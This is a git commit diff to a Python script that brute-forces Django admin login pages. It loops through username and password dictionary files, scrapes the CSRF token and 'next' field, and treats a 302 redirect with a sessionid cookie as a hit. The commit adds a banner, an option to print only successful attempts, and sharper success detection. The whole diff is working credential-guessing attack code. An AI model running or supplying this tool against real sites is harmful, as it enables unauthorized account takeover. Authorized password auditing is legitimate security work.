99edea37430c2dfb802151494a2492c5c7df3dc4
n3bojs4 <n3bojs4@gmail.com>
2023-01-27 15:00:45 +0100

    improvements + onlygood option

--- DjangoUnchained.py
+++ DjangoUnchained.py
@@ -1,6 +1,31 @@
+#!/usr/bin/env python
+
+from operator import eq
 import urllib3
 import argparse
 from bs4 import BeautifulSoup
+
+
+def banner():
+    print("""
+---------------------------------------------------
+  ____  _                                         
+ |  _ \(_) __ _ _ __   __ _  ___                  
+ | | | | |/ _` | '_ \ / _` |/ _ \                 
+ | |_| | | (_| | | | | (_| | (_) |                
+ |____// |\__,_|_| |_|\__, |\___/                 
+     |__/             |___/                       
+  _   _            _           _                _ 
+ | | | |_ __   ___| |__   __ _(_)_ __   ___  __| |
+ | | | | '_ \ / __| '_ \ / _` | | '_ \ / _ \/ _` |
+ | |_| | | | | (__| | | | (_| | | | | |  __/ (_| |
+  \___/|_| |_|\___|_| |_|\__,_|_|_| |_|\___|\__,_|
+
+----------------------------------------------------                                                  
+
+Django Admin Panel password testing tool v0.1 - by n3bojs4   
+    """)
+
 
 
 # Get arguments
@@ -8,11 +33,15 @@ from bs4 import BeautifulSoup
 parser = argparse.ArgumentParser()
 parser.add_argument("-domain",help="Domain for the django admin login page.",required=True)
 parser.add_argument("-scheme",help="http or https scheme.",required=True)
-parser.add_argument("-uri",help="uri for the admin login page.",required=True)
+parser.add_argument("-uri",help="uri for the admin login page, \"/admin/login/\" is the most common.",required=True)
 parser.add_argument("-userdict",help="dictionnary file for user list.",required=True)
 parser.add_argument("-passwdict",help="dictionnary file for password.",required=True)
+parser.add_argument("-onlygood",help="Show only good attempts.",action='store_true', default=False, required=False)
 
+# Show banner
+banner()
 
+# Parse args
 args = parser.parse_args()
 
 domain = args.domain
@@ -20,6 +49,7 @@ scheme = args.scheme
 uri = args.uri
 userdict = args.userdict
 passwords = args.passwdict
+onlygood = args.onlygood
 
 admin_url = scheme + '://' + domain + uri
 
@@ -61,22 +91,27 @@ def Authenticate(admin_url,username,password):
     # Getting the csrf token
     csrfmiddlewaretoken = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
     
+    # Getting next page
+    nextpage = soup.find('input', {'name': 'next'})['value']
+    
     # creating the fields and the headers
     headers["Cookie"] = Cookies
     
-    # payload for authentication
-    payload = "csrfmiddlewaretoken="+csrfmiddlewaretoken+"&"+"username="+username+"&password="+password
+    payload = "csrfmiddlewaretoken="+csrfmiddlewaretoken+"&"+"username="+username+"&"+"next="+nextpage+"&password="+password
     
-    postlogin = http.request('POST', admin_url, headers=headers, body=payload)
+    postlogin = http.request('POST', admin_url, headers=headers, body=payload, redirect=False)
     data = postlogin.data.decode('utf-8')
 
     if "CSRF" in data:
         print("CSRF token missing or invalid !")
-    if "Please" in data:
+    if "Please" in data and onlygood is False:
         print("Trying username:",username, "password:",password, "FAILED")
-    else:
-        print("Found a valid account !!! --> username:", username, "pass:",password)
-
+    if postlogin.status == 302 :
+        if "sessionid" in postlogin.headers["Set-Cookie"]:
+            print("Found a valid account !!! --> username:", username, "pass:",password)
+        else:
+            print("It seems we found a valid account --> username:", username, "pass:",password,"but no sessionid cookie has been set, check manually !")
+    
 
 userlist = list(set([(word.strip()) for word in USERS.readlines()]))
 passwordlist = list(set([(word.strip()) for word in PASSWORDS.readlines()]))
